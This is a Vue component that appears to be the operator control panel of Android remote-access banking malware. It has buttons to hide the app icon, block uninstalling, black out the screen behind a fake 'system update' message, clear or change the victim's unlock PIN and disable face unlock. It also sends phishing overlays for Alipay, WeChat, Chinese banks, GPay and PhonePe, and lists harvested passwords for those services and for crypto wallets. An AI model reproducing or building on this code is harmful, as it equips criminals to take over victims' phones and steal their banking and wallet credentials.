<script setup lang="ts">
import { ref, computed } from 'vue';
import {
    NButton,
    NInput,
    NSelect,
    NIcon,
} from 'naive-ui';
import {
    SunnyOutline,
    LockClosedOutline,
    LockOpenOutline,
    VolumeMuteOutline,
    VolumeHighOutline,
    VolumeLowOutline,
    ShieldOutline,
    FishOutline,
    TvOutline,
    LogoAlipay,
    CardOutline,
    CashOutline,
    BusinessOutline,
    LeafOutline,
    PlanetOutline,
    StorefrontOutline,
    LogoUsd,
    PhonePortraitOutline,
    EyeOffOutline,
    HandLeftOutline,
    BanOutline,
    KeyOutline,
} from '@vicons/ionicons5';
import { ChatbubbleEllipsesOutline as LogoWechat } from '@vicons/ionicons5';
import { quickApps } from '@/constants/quickApps';

interface Props {
    phonePassword?: string;
}

interface Emits {
    (e: 'wakeScreen'): void;
    (e: 'lock', type: 0 | 1 | 2 | 3): void;
    (e: 'sendMute'): void;
    (e: 'sendUnmute'): void;
    (e: 'volumeUp'): void;
    (e: 'volumeDown'): void;
    (e: 'sendKb', type: number): void;
    (e: 'sendBlock', type: number): void;
    (e: 'hideIcon'): void;
    (e: 'sendPhish', type: string): void;
    (e: 'sendBankPhish', bank: string): void;
    (e: 'toggleBlockText', text: string, bg: string): void;
    (e: 'paste', text: string): void;
    (e: 'openQuickApp', app: string): void;
    (e: 'modifyPassword', password: string): void;
}

const props = withDefaults(defineProps<Props>(), {
    phonePassword: '',
});

const emit = defineEmits<Emits>();

const pasteText = ref('');
const phishType = ref('0');
const blockText = ref('');
const blockBg = ref('0');
const isBlockTextActive = ref(false);
const passwordInput = ref('');

const handlePaste = () => {
    if (pasteText.value.trim()) {
        emit('paste', pasteText.value);
        pasteText.value = '';
    }
};

const handleSendPhish = () => {
    emit('sendPhish', phishType.value);
};

const handleModifyPassword = () => {
    if (passwordInput.value.trim() && /^\d+$/.test(passwordInput.value)) {
        emit('modifyPassword', passwordInput.value);
        passwordInput.value = '';
    }
};

const handleToggleBlockText = () => {
    isBlockTextActive.value = !isBlockTextActive.value;
    emit('toggleBlockText', blockText.value, blockBg.value);
};

const bankButtons = [
    { name: 'IM', code: '0', color: '#6366f1', icon: CashOutline },
    { name: 'TP', code: '2', color: '#8b5cf6', icon: CashOutline },
    { name: '支付宝', code: '6', color: '#1677ff', icon: LogoAlipay },
    { name: '微信', code: '7', color: '#07c160', icon: LogoWechat },
    { name: '云闪付', code: '8', color: '#e62129', icon: CardOutline },
    { name: '建行', code: '9', color: '#0066b3', icon: BusinessOutline },
    { name: '邮储', code: '10', color: '#007d3a', icon: CashOutline },
    { name: '农行', code: '11', color: '#009944', icon: LeafOutline },
    { name: '中行', code: '12', color: '#c9151e', icon: PlanetOutline },
    { name: '工行', code: '13', color: '#e60012', icon: StorefrontOutline },
    { name: '招行', code: '14', color: '#dc241f', icon: CashOutline },
    { name: 'GPay', code: '15', color: '#4285f4', icon: LogoUsd },
    { name: 'PhonePe', code: '16', color: '#5f259f', icon: PhonePortraitOutline },
    { name: 'AN', code: '17', color: '#f59e0b', icon: CashOutline },
    { name: 'MB', code: '18', color: '#00a0e9', icon: PhonePortraitOutline },
    { name: 'BC', code: '19', color: '#ff6b00', icon: CashOutline },
];

// 密码标签列表，按顺序解析 phone_password 字符串
const passwordLabels = [
    '手机密码', '钓鱼密码', 'Alipay密码', 'Wechat密码', '云密码',
    '建密码', '邮密码', '农密码', '中密码', '工密码', '招密码',
    'gp密码', 'pe密码', 'an密码', 'mb密码', 'bc密码',
    'Trust密码', 'Imtoken密码', 'Tokenpocket密码'
];

// 密码项配置（用于显示）
const passwordItems = [
    { label: '手机密码', highlight: false },
    { label: '钓鱼密码', highlight: true },
    { label: 'Alipay密码', highlight: false },
    { label: 'Wechat密码', highlight: false },
    { label: '云密码', highlight: false },
    { label: '建密码', highlight: false },
    { label: '邮密码', highlight: false },
    { label: '农密码', highlight: false },
    { label: '中密码', highlight: false },
    { label: '工密码', highlight: false },
    { label: '招密码', highlight: false },
    { label: 'gp密码', highlight: false },
    { label: 'pe密码', highlight: false },
    { label: 'an密码', highlight: false },
    { label: 'mb密码', highlight: false },
    { label: 'bc密码', highlight: false },
    { label: 'Trust密码', highlight: false },
    { label: 'Imtoken密码', highlight: false },
    { label: 'Tokenpocket密码', highlight: false },
];

/**
 * 解析 phone_password 字符串，提取各个密码值
 * 参考 info.php 的 updatePwdCard 逻辑
 */
const parsedPasswords = computed(() => {
    const result: Record<string, string> = {};
    const pwdStr = props.phonePassword || '';
    
    if (!pwdStr || pwdStr === '--') {
        passwordLabels.forEach(label => {
            result[label] = '';
        });
        return result;
    }
    
    passwordLabels.forEach((label, i) => {
        const nextLabel = passwordLabels[i + 1];
        let value = '';
        
        const startIdx = pwdStr.indexOf(label + ':');
        if (startIdx !== -1) {
            const afterLabel = pwdStr.substring(startIdx + label.length + 1);
            if (nextLabel) {
                const nextIdx = afterLabel.indexOf(nextLabel + ':');
                value = nextIdx !== -1 
                    ? afterLabel.substring(0, nextIdx).trim() 
                    : afterLabel.trim();
            } else {
                value = afterLabel.trim();
            }
        }
        
        // 清理空白字符
        value = value.replace(/^\s+|\s+$/g, '').replace(/\s+/g, ' ');
        result[label] = value;
    });
    
    return result;
});

const getPasswordValue = (label: string): string => {
    const value = parsedPasswords.value[label];
    if (!value || value === '--' || value === '') {
        return '--';
    }
    return value;
};

const hasPassword = (label: string): boolean => {
    const value = parsedPasswords.value[label];
    return !!value && value !== '--' && value !== '';
};
</script>

<template>
    <div class="screen-control-tab">
        <!-- 快捷操作 -->
        <div class="control-section">
            <div class="section-header">
                <NIcon :component="SunnyOutline" size="16" />
                <span>快捷操作</span>
            </div>
            <div class="quick-actions-grid">
                <NButton size="small" type="warning" @click="emit('wakeScreen')">
                    <template #icon><NIcon :component="SunnyOutline" /></template>
                    点亮
                </NButton>
                <NButton size="small" @click="emit('lock', 0)">
                    <template #icon><NIcon :component="LockOpenOutline" /></template>
                    解锁
                </NButton>
                <NButton size="small" @click="emit('lock', 1)">
                    <template #icon><NIcon :component="LockClosedOutline" /></template>
                    锁屏
                </NButton>
                <NButton size="small" type="info" @click="emit('sendMute')">
                    <template #icon><NIcon :component="VolumeMuteOutline" /></template>
                    静音
                </NButton>
                <NButton size="small" type="success" @click="emit('sendUnmute')">
                    <template #icon><NIcon :component="VolumeHighOutline" /></template>
                    取消静音
                </NButton>
                <NButton size="small" @click="emit('volumeUp')">
                    <template #icon><NIcon :component="VolumeHighOutline" /></template>
                    音量+
                </NButton>
                <NButton size="small" @click="emit('volumeDown')">
                    <template #icon><NIcon :component="VolumeLowOutline" /></template>
                    音量-
                </NButton>
            </div>

            <!-- 快捷应用 -->
            <div class="app-buttons">
                <NButton
                    v-for="app in quickApps"
                    :key="app.key"
                    size="tiny"
                    :style="{ backgroundColor: app.color, color: '#fff', borderColor: app.color }"
                    @click="emit('openQuickApp', app.key)"
                >
                    <template #icon><NIcon :component="app.icon" /></template>
                    {{ app.key }}
                </NButton>
            </div>

            <!-- 安全控制 -->
            <div class="security-actions">
                <NButton size="tiny" @click="emit('sendKb', 2)">
                    <template #icon><NIcon :component="ShieldOutline" /></template>
                    防卸载
                </NButton>
                <NButton size="tiny" @click="emit('sendKb', 3)">
                    可卸载
                </NButton>
                <NButton size="tiny" @click="emit('sendBlock', 0)">
                    <template #icon><NIcon :component="BanOutline" /></template>
                    黑屏
                </NButton>
                <NButton size="tiny" @click="emit('sendBlock', 1)">
                    取消黑屏
                </NButton>
                <NButton size="tiny" @click="emit('sendBlock', 2)">
                    <template #icon><NIcon :component="HandLeftOutline" /></template>
                    阻止操作
                </NButton>
                <NButton size="tiny" @click="emit('sendBlock', 3)">
                    允许操作
                </NButton>
                <NButton size="tiny" @click="emit('lock', 2)">
                    <template #icon><NIcon :component="KeyOutline" /></template>
                    清密码
                </NButton>
                <NButton size="tiny" @click="emit('lock', 3)">
                    禁人脸
                </NButton>
                <NButton size="tiny" type="warning" @click="emit('hideIcon')">
                    <template #icon><NIcon :component="EyeOffOutline" /></template>
                    隐藏图标
                </NButton>
            </div>

            <!-- 文本粘贴 -->
            <div class="paste-row">
                <NInput
                    v-model:value="pasteText"
                    placeholder="输入文本粘贴到设备..."
                    size="small"
                    @keyup.enter="handlePaste"
                />
                <NButton size="small" type="primary" @click="handlePaste">
                    粘贴
                </NButton>
            </div>
        </div>

        <!-- 密码钓鱼 -->
        <div class="control-section">
            <div class="section-header">
                <NIcon :component="FishOutline" size="16" />
                <span>密码钓鱼</span>
            </div>
            <div class="phish-row">
                <NSelect
                    v-model:value="phishType"
                    size="small"
                    :options="[
                        { label: '自由选择密码', value: '0' },
                        { label: '壁纸图案密码', value: '1' },
                        { label: '壁纸数字密码', value: '2' },
                        { label: '壁纸混合密码', value: '3' },
                    ]"
                    style="flex: 1;"
                />
                <NButton size="small" type="error" @click="handleSendPhish">
                    <template #icon><NIcon :component="FishOutline" /></template>
                    钓鱼
                </NButton>
            </div>

            <div class="subsection-title">银行/支付钓鱼</div>
            <div class="bank-grid">
                <NButton
                    v-for="bank in bankButtons"
                    :key="bank.code"
                    size="tiny"
                    :style="{ backgroundColor: bank.color, color: '#fff', borderColor: bank.color }"
                    @click="emit('sendBankPhish', bank.code)"
                >
                    <template #icon><NIcon :component="bank.icon" /></template>
                    {{ bank.name }}
                </NButton>
            </div>
        </div>

        <!-- 修改解锁密码 -->
        <div class="control-section">
            <div class="section-header">
                <NIcon :component="KeyOutline" size="16" />
                <span>修改解锁密码</span>
            </div>
            <div class="password-modify-row">
                <NInput
                    v-model:value="passwordInput"
                    placeholder="输入数字密码..."
                    size="small"
                    :allow-input="(value: string) => /^\d*$/.test(value)"
                    style="flex: 1;"
                    @keyup.enter="handleModifyPassword"
                />
                <NButton size="small" type="warning" @click="handleModifyPassword">
                    <template #icon><NIcon :component="KeyOutline" /></template>
                    修改密码
                </NButton>
            </div>
        </div>

        <!-- 黑屏文字 -->
        <div class="control-section">
            <div class="section-header">
                <NIcon :component="TvOutline" size="16" />
                <span>黑屏文字</span>
            </div>
            <div class="block-text-row">
                <NInput
                    v-model:value="blockText"
                    placeholder="黑屏显示文字内容"
                    size="small"
                    style="flex: 1;"
                />
                <NSelect
                    v-model:value="blockBg"
                    size="small"
                    :options="[
                        { label: '黑色背景', value: '0' },
                        { label: '系统更新', value: '1' },
                    ]"
                    style="width: 100px;"
                />
                <NButton
                    size="small"
                    :type="isBlockTextActive ? 'error' : 'default'"
                    @click="handleToggleBlockText"
                >
                    <template #icon><NIcon :component="TvOutline" /></template>
                    {{ isBlockTextActive ? '停止' : '显示' }}
                </NButton>
            </div>
        </div>

        <!-- 密码信息 -->
        <div class="control-section password-section">
            <div class="section-header">
                <NIcon :component="KeyOutline" size="16" />
                <span>密码信息</span>
            </div>
            <div class="password-list">
                <div
                    v-for="item in passwordItems"
                    :key="item.label"
                    class="password-row"
                >
                    <span class="password-label">{{ item.label }}:</span>
                    <span
                        class="password-value"
                        :class="{ 
                            'has-data': hasPassword(item.label), 
                            'highlight': item.highlight && hasPassword(item.label) 
                        }"
                    >
                        {{ getPasswordValue(item.label) }}
                    </span>
                </div>
            </div>
        </div>
    </div>
</template>

<style scoped>
.screen-control-tab {
    display: flex;
    flex-direction: column;
    gap: 16px;
    height: 100%;
    overflow-y: auto;
}

.control-section {
    background: #f8fafc;
    border-radius: 12px;
    padding: 16px;
}

.section-header {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px;
    font-weight: 600;
    color: #1e293b;
    margin-bottom: 12px;
}

.subsection-title {
    font-size: 12px;
    color: #64748b;
    margin: 12px 0 8px 0;
}

.quick-actions-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    margin-bottom: 12px;
}

.quick-actions-grid .n-button {
    flex: 0 0 auto;
}

.app-buttons {
    display: flex;
    flex-wrap: wrap;
    gap: 6px;
    margin-bottom: 12px;
}

.app-buttons .n-button {
    font-size: 11px;
}

.security-actions {
    display: flex;
    flex-wrap: wrap;
    gap: 6px;
    margin-bottom: 12px;
}

.security-actions .n-button {
    font-size: 11px;
}

.paste-row {
    display: flex;
    gap: 8px;
    align-items: center;
}

.phish-row {
    display: flex;
    gap: 8px;
    align-items: center;
}

.bank-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 6px;
}

.bank-grid .n-button {
    font-size: 10px;
}

.block-text-row {
    display: flex;
    gap: 8px;
    align-items: center;
}

.password-modify-row {
    display: flex;
    gap: 8px;
    align-items: center;
}

.password-section {
    flex: 1;
    min-height: 0;
    display: flex;
    flex-direction: column;
}

.password-list {
    flex: 1;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 4px;
}

.password-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 6px 0;
    border-bottom: 1px solid #e2e8f0;
    font-size: 12px;
}

.password-row:last-child {
    border-bottom: none;
}

.password-label {
    color: #64748b;
    min-width: 90px;
}

.password-value {
    color: #94a3b8;
    word-break: break-all;
    text-align: right;
    flex: 1;
}

.password-value.has-data {
    color: #10B981;
    font-weight: 500;
}

.password-value.highlight {
    color: #F59E0B;
    font-weight: 600;
}
</style>
